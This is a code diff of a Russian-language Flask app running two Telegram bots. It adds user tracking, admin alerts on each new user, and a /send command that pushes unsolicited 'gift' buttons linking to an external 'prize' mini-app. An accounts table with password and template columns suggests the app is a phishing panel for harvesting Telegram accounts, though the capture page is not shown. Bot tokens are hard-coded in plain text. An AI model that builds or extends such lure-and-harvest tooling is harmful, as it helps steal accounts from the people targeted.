@@ -9,8 +9,8 @@ from datetime import datetime
 import threading
 
 # ========== КОНФИГ ==========
-BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"  # панель + отправка кнопок
-CLIENT_TOKEN = "8638305124:AAG6a1JWNDUEHywMpoeZdtf6gaDIfI9Npqk"  # клиентский бот (только приём)
+BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"  # панель
+CLIENT_TOKEN = "8638305124:AAG6a1JWNDUEHywMpoeZdtf6gaDIfI9Npqk"  # клиентский бот
 ADMIN_ID = 8899193168
 MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
 MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
@@ -32,6 +32,14 @@ def init_db():
             password TEXT,
             template TEXT,
             status TEXT,
+            created_at INTEGER
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            first_name TEXT,
             created_at INTEGER
         )
     """)
@@ -57,9 +65,35 @@ def get_accounts_count():
     conn.close()
     return count
 
-# ========== ОТПРАВКА СООБЩЕНИЙ (ВСЁ ЧЕРЕЗ ОСНОВНОГО БОТА) ==========
-def send_message(chat_id, text, reply_markup=None, parse_mode=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+def get_users_count():
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT COUNT(*) FROM users")
+    count = cursor.fetchone()[0]
+    conn.close()
+    return count
+
+def get_all_users():
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id, username, first_name, created_at FROM users ORDER BY created_at DESC")
+    rows = cursor.fetchall()
+    conn.close()
+    return rows
+
+def save_user(user_id, username, first_name):
+    conn = sqlite3.connect("bot_panel.db")
+    cursor = conn.cursor()
+    cursor.execute(
+        "INSERT OR IGNORE INTO users (user_id, username, first_name, created_at) VALUES (?, ?, ?, ?)",
+        (user_id, username, first_name, int(datetime.now().timestamp()))
+    )
+    conn.commit()
+    conn.close()
+
+# ========== ОТПРАВКА СООБЩЕНИЙ ==========
+def send_message(chat_id, text, reply_markup=None, parse_mode=None, token=BOT_TOKEN):
+    url = f"https://api.telegram.org/bot{token}/sendMessage"
     payload = {"chat_id": chat_id, "text": text}
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
@@ -73,7 +107,7 @@ def send_message(chat_id, text, reply_markup=None, parse_mode=None):
         logging.error(f"❌ Ошибка отправки: {e}")
         return False
 
-# ========== ОБРАБОТКА ВЕБХУКА ==========
+# ========== ОБРАБОТКА ВЕБХУКА (панель) ==========
 @app.route("/", methods=["POST"])
 def webhook():
     data = request.get_json()
@@ -100,15 +134,19 @@ def webhook():
                 return "OK", 200
             show_admin_panel(chat_id)
 
+        elif text == "/users":
+            if chat_id != ADMIN_ID:
+                send_message(chat_id, "⛔ У вас нет доступа.")
+                return "OK", 200
+            show_users_list(chat_id)
+
         elif text.startswith("/send"):
             parts = text.split()
-            if len(parts) < 3:
-                send_message(chat_id, "❌ Формат: `/send @username premium` или `/send @username osint`", parse_mode="Markdown")
+            if len(parts) < 2:
+                send_message(chat_id, "❌ Формат: `/send ID premium` или `/send ID osint`", parse_mode="Markdown")
                 return "OK", 200
             target = parts[1].strip()
-            if not target.startswith("@"):
-                target = "@" + target
-            button_type = parts[2].strip().lower()
+            button_type = parts[2].strip().lower() if len(parts) > 2 else "premium"
 
             if button_type == "premium":
                 url = MINI_APP_URL
@@ -127,9 +165,9 @@ def webhook():
             }
             success = send_message(target, f"🎁 Вам отправили кнопку **{label}**!", reply_markup=keyboard, parse_mode="Markdown")
             if success:
-                send_message(chat_id, f"✅ Кнопка `{label}` отправлена пользователю {target}", parse_mode="Markdown")
+                send_message(chat_id, f"✅ Кнопка `{label}` отправлена пользователю с ID `{target}`", parse_mode="Markdown")
             else:
-                send_message(chat_id, f"❌ Не удалось отправить кнопку {target}. Возможно, пользователь не начал диалог с ботом.", parse_mode="Markdown")
+                send_message(chat_id, f"❌ Не удалось отправить кнопку пользователю с ID `{target}`. Возможно, он не начал диалог с ботом.", parse_mode="Markdown")
 
     elif "callback_query" in data:
         query = data["callback_query"]
@@ -147,10 +185,10 @@ def webhook():
             send_message(chat_id, "🔧 **Выберите тип кнопки для отправки:**", reply_markup=keyboard)
 
         elif data_callback == "send_premium":
-            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username premium`", parse_mode="Markdown")
+            send_message(chat_id, "✏️ Введите ID пользователя и тип:\n`/send 123456789 premium`", parse_mode="Markdown")
 
         elif data_callback == "send_osint":
-            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username osint`", parse_mode="Markdown")
+            send_message(chat_id, "✏️ Введите ID пользователя и тип:\n`/send 123456789 osint`", parse_mode="Markdown")
 
         elif data_callback == "back_to_menu":
             keyboard = {
@@ -182,6 +220,82 @@ def webhook():
 
     return "OK", 200
 
+# ========== КЛИЕНТСКИЙ БОТ (профиль + уведомление админу) ==========
+@app.route("/client", methods=["POST"])
+def webhook_client():
+    data = request.get_json()
+    if not data:
+        return "OK", 200
+
+    if "message" in data:
+        msg = data["message"]
+        chat_id = msg["chat"]["id"]
+        text = msg.get("text", "")
+        username = msg.get("username", "")
+        first_name = msg.get("first_name", "")
+
+        if text == "/start":
+            # Сохраняем пользователя
+            save_user(chat_id, username, first_name)
+
+            # Уведомление админу
+            send_message(
+                ADMIN_ID,
+                f"🆕 **Новый пользователь!**\n\n"
+                f"🆔 ID: `{chat_id}`\n"
+                f"👤 Имя: {first_name}\n"
+                f"📛 Юзернейм: @{username if username else 'нет'}\n"
+                f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
+                parse_mode="Markdown"
+            )
+
+            # Профиль пользователя
+            keyboard = {
+                "inline_keyboard": [
+                    [{"text": "📋 Мой ID", "callback_data": "copy_id"}],
+                    [{"text": "📊 Статистика", "callback_data": "client_stats"}]
+                ]
+            }
+            send_message(
+                chat_id,
+                f"👤 **Ваш профиль**\n\n"
+                f"🆔 Ваш ID: `{chat_id}`\n"
+                f"📌 Используйте этот ID для получения кнопок в основном боте.\n\n"
+                f"📤 Чтобы получить кнопку, напишите в @cdcdcdfgdbot:\n"
+                f"`/send {chat_id} premium`",
+                reply_markup=keyboard,
+                parse_mode="Markdown",
+                token=CLIENT_TOKEN
+            )
+
+    elif "callback_query" in data:
+        query = data["callback_query"]
+        chat_id = query["message"]["chat"]["id"]
+        data_callback = query.get("data")
+
+        if data_callback == "copy_id":
+            send_message(
+                chat_id,
+                f"🆔 Ваш ID: `{chat_id}`\n\n"
+                f"Скопируйте его и отправьте в @cdcdcdfgdbot:\n"
+                f"`/send {chat_id} premium`",
+                parse_mode="Markdown",
+                token=CLIENT_TOKEN
+            )
+
+        elif data_callback == "client_stats":
+            send_message(
+                chat_id,
+                f"📊 **Ваша статистика**\n\n"
+                f"🆔 ID: `{chat_id}`\n"
+                f"📅 Активен: {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
+                f"📌 Бот: @fikeikddbot",
+                parse_mode="Markdown",
+                token=CLIENT_TOKEN
+            )
+
+    return "OK", 200
+
 # ========== АДМИН-ПАНЕЛЬ В БОТЕ ==========
 def show_admin_panel(chat_id):
     rows = get_all_accounts()
@@ -206,6 +320,20 @@ def show_admin_panel(chat_id):
         ]
     }
     send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")
+
+def show_users_list(chat_id):
+    users = get_all_users()
+    if not users:
+        send_message(chat_id, "📭 Нет зарегистрированных пользователей.")
+        return
+
+    msg = "👥 **Список пользователей:**\n\n"
+    for i, (user_id, username, first_name, created_at) in enumerate(users[:20], 1):
+        date = datetime.fromtimestamp(created_at).strftime("%d.%m %H:%M")
+        msg += f"{i}. 👤 {first_name} (@{username if username else 'нет'})\n"
+        msg += f"   🆔 `{user_id}` | 🕒 {date}\n\n"
+
+    send_message(chat_id, msg, parse_mode="Markdown")
 
 # ========== API ДЛЯ ВЕБ-АДМИНКИ ==========
 @app.route("/api/accounts")
